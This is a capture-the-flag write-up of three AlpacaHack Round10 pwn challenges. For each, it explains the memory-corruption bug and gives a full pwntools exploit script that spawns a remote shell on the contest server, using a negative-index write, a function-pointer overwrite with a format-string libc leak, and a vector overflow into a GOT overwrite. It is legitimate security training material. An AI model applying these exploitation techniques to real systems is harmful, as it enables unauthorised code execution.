# AlpacaHack Round10
<primary-label ref="pwn"/>

日本語: [](AlpacaHack-Round10-Jp.md)

## Preface
I participated in [AlpacaHack Round10 (Pwn)](https://alpacahack.com/ctfs/round-10).
AlpacaHack always provides stimulating challenge and is a platform where you can also challenge past challenge.

Round10 had 3 userland challenges and 1 kernel challenge. I couldn't solve the kernel one, so I'll try it again another time.

![Screenshot_20250323_171502.png](Screenshot_20250323_171502.png)

## Oyster
<secondary-label ref="user"/>
<secondary-label ref="rce"/>

The operation at L26 appears at first glance to be putting a null character at the end of a string, but if `buf[0]` is `\0`, an out-of-bounds (oob) access with a negative index occurs.
```c
  buf[strlen(buf)-1] = '\0';
```

![Screenshot_20250323_164627.png](Screenshot_20250323_164627.png)

During password input, `cred.err` is located at `buf[-1]`, so if `buf` is a single null character, `cred.err` is satisfied by the operation `buf[strlen(buf)-1] = '\0';`.

```py
from pwn import *
import sys

e = ELF("oyster",checksec=False)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
ld = ELF("/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2",checksec=False)

nc = "nc 34.170.146.252 44367"
HOST = nc.split(" ")[1]
PORT = int(nc.split(" ")[2])

dbg = 1
g_script = """
    set max-visualize-chunk-size 0x300
"""

context.binary = e
if len(sys.argv) > 1:
    io = remote(host=HOST,port=PORT)
else:
    io = e.process()
    if dbg:
        gdb.attach(io,g_script)

s   = lambda b: io.send(b)
sa  = lambda a,b: io.sendafter(a,b)
sl  = lambda b: io.sendline(b)
sla = lambda a,b: io.sendlineafter(a,b)
r   = lambda : io.recv()
ru  = lambda b:io.recvuntil(b)
rl  = lambda : io.recvline()
pu32= lambda b : u32(b.ljust(4,b"\0"))
pu64= lambda b : u64(b.ljust(8,b"\0"))
hlog= lambda i : print(f"[*]{hex(i)}")
shell = lambda : io.interactive()
payload = b""
def pay64(adr:int):global payload;payload = p64(adr)
def add64(adr:int):global payload;payload+= p64(adr)
def paybyte(data:bytes):global payload;payload = data
def addbyte(data:bytes):global payload;payload+= data


sl(b"root")
sl(b"\0")


shell()
```


## Kangaroo
<secondary-label ref="user"/>
<secondary-label ref="rce"/>

There is an obvious Integer Overflow. After calculation, the index
```Py
-256204778801521543
```
results in an offset of 520. Therefore, the function pointer after `g_message` can be overwritten.

No win function is provided, so we need to perform a libc leak to get a shell.
I changed the function pointer to `printf@plt` to cause a format string bug and leak libc.

After the libc leak, I put the address of system into the function pointer, placed `/bin/sh\0` in `g_messages`, and then called the function pointer to get a shell :happy:

```py

from pwn import *
import sys

e = ELF("kangaroo_patched",checksec=False)
libc = ELF("libc.so.6",checksec=False)
ld = ELF("ld-linux-x86-64.so.2",checksec=False)

nc = "nc 34.170.146.252 54223"
HOST = nc.split(" ")[1]
PORT = int(nc.split(" ")[2])

dbg = 1
g_script = """
    set max-visualize-chunk-size 0x300
"""

context.binary = e
if len(sys.argv) > 1:
    io = remote(host=HOST,port=PORT)
else:
    io = e.process()
    if dbg:
        gdb.attach(io,g_script)

s   = lambda b: io.send(b)
sa  = lambda a,b: io.sendafter(a,b)
sl  = lambda b: io.sendline(b)
sla = lambda a,b: io.sendlineafter(a,b)
r   = lambda : io.recv()
ru  = lambda b:io.recvuntil(b)
rl  = lambda : io.recvline()
pu32= lambda b : u32(b.ljust(4,b"\0"))
pu64= lambda b : u64(b.ljust(8,b"\0"))
hlog= lambda i : print(f"[*]{hex(i)}")
shell = lambda : io.interactive()
payload = b""
def pay64(adr:int):global payload;payload = p64(adr)
def add64(adr:int):global payload;payload+= p64(adr)
def paybyte(data:bytes):global payload;payload = data
def addbyte(data:bytes):global payload;payload+= data


idx = -256204778801521543

print(ru(b"> "))
sl(b"1")
print(ru(b"Index: "))
sl(str(0).encode())
print(ru(b"Message: "))
sl("%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx")

print(ru(b"> "))
sl(b"1")
print(ru(b"Index: "))
sl(str(7).encode())
print(ru(b"Message: "))
s(b"A"*0x48)


paybyte(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
add64(e.plt["printf"])
print(ru(b"> "))
sl(b"1")
print(ru(b"Index: "))
sl(str(idx).encode())
print(ru(b"Message: "))
sl(payload)

leakidx = 8
diff = 0x2a1ca

print(ru(b"> "))
sl(b"3")
res = r()
leak = res.split(b",")[leakidx]
leak = int(leak,16)
libc.address = leak - diff
hlog(libc.address)


paybyte(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
add64(libc.sym["system"])

sl(b"1")
print(ru(b"Index: "))
sl(str(0).encode())
print(ru(b"Message: "))
sl(b"/bin/sh\x00")


print(ru(b"> "))
sl(b"1")
print(ru(b"Index: "))
sl(str(idx).encode())
print(ru(b"Message: "))
sl(payload)

sl(b"3")


shell()

```

## Takahashi
<secondary-label ref="user"/>
<secondary-label ref="rce"/>
<secondary-label ref="aarw"/>

Who is Takahashi?
This challenge appears to be based on an Atcoder solver.

```CPP
int Q;
int QueryType[100009], x[100009];
priority_queue<int, vector<int>, greater<int>> T;
int main() {
	cin >> Q;
	for (int i = 1; i <= Q; i++) {
		cin >> QueryType[i];
		if (QueryType[i] == 1) cin >> x[i];
	}
	for (int i = 1; i <= Q; i++) {
		if (QueryType[i] == 1) T.push(x[i]);
		if (QueryType[i] == 2) cout << T.top() << endl;
		if (QueryType[i] == 3) T.pop();
	}
	return 0;
}
void win() { std::system("/bin/sh"); } // Gift :)
```

There's an obvious out-of-bounds (oob) that causes overflow in the `.bss` region. Additionally, the int vector array is also declared globally and exists in the `.bss` area.

Wait, we remembered Vector Overflow from Down Under CTF 2024. I also wrote a [writeup: DUCTF Vector Overflow](helloWorld.md) for this challenge.
```CPP
typename _Tp_alloc_type::pointer _M_start;
typename _Tp_alloc_type::pointer _M_finish;
typename _Tp_alloc_type::pointer _M_end_of_storage;
```
In C++, Vector types are allocated like this. The actual data is allocated in the heap area, but if we can modify elements through oob, we can create an AAR/W primitive.

With `Partial RELRO`, GOT overwrite seems possible. Since a Win function is provided, I overwrote the unresolved `memmove@got` with the win address to get a shell.

When `_M_end_of_storage` is exhausted, the vector allocates a new area twice the size of the current area and uses `memmove`. I created a fake vector structure that was sufficient to write 4 bytes to `memmove@got`.

```py
from pwn import *
import sys

e = ELF("a.out",checksec=False)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
ld = ELF("/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2",checksec=False)

nc = "nc 34.170.146.252 55287"
HOST = nc.split(" ")[1]
PORT = int(nc.split(" ")[2])

dbg = 1
g_script = """
    #set max-visualize-chunk-size 0x300
    b *0x000000000040138d
    b *0x0000000000401426
"""

context.binary = e
if len(sys.argv) > 1:
    io = remote(host=HOST,port=PORT)
else:
    io = e.process()
    if dbg:
        gdb.attach(io,g_script)

s   = lambda b: io.send(b)
sa  = lambda a,b: io.sendafter(a,b)
sl  = lambda b: io.sendline(b)
sla = lambda a,b: io.sendlineafter(a,b)
r   = lambda : io.recv()
ru  = lambda b:io.recvuntil(b)
rl  = lambda : io.recvline()
pu32= lambda b : u32(b.ljust(4,b"\0"))
pu64= lambda b : u64(b.ljust(8,b"\0"))
hlog= lambda i : print(f"[*]{hex(i)}")
shell = lambda : io.interactive()
payload = b""
def pay64(adr:int):global payload;payload = p64(adr)
def add64(adr:int):global payload;payload+= p64(adr)
def paybyte(data:bytes):global payload;payload = data
def addbyte(data:bytes):global payload;payload+= data

qt_sz = 100009

tmp = input("go??????????????????????????")
sl(str(100022).encode())

tmp = input("go??????????????????????????")
"""
gef> x/4gx 0x04c8860
0x4c8860 <T>:   0x00000000004db6c0      0x00000000004db6cc
0x4c8870 <T+16>:        0x00000000004db6d0      0x0000000000000000
"""
vec_new = 0x0405030  #void* (* const operator new(uint64_t))(std::size_t sz) = operator new(uint64_t)
win = 0x0401427
sl(b"4")
sleep(0.1)
sl(b"4")
sleep(0.1)
sl(b"4")
sleep(0.1)
sl(b"4")
sleep(0.1)
sl(b"4")
sleep(0.1)
sl(b"4")
sleep(0.1)
sl(b"4")
sleep(0.1)
paybyte(f"1\n4199463".encode())
sl(payload)
paybyte(f"1\n0".encode())
sl(payload)
paybyte(f"1\n4199463".encode())
sl(payload)
paybyte(f"4".encode())
sl(payload)
paybyte(f"1\n4199463".encode())
sl(payload)
paybyte(f"4".encode())
sl(payload)
paybyte(f"1\n4199463".encode())
sl(payload)
paybyte(f"4".encode())
sl(payload)
for i in range(qt_sz-3-8):
    #paybyte(f"1\n4199463".encode())
    paybyte(f"4\n".encode())
    sl(payload)

for i in range(100022-qt_sz-7-4):
    paybyte(f"1\n4660".encode())
    sl(payload)


vec_new = 0x00405050
sl(f"1\n{str(vec_new-8)}".encode())
sl(f"1\n{str(0)}".encode())
sl(f"1\n{str(vec_new)}".encode())
sl(f"1\n{str(0)}".encode())
sl(f"1\n{str(vec_new+16)}".encode())
sl(f"1\n{str(0)}".encode())
sl(f"1\n{str(0)}".encode())

shell()

```


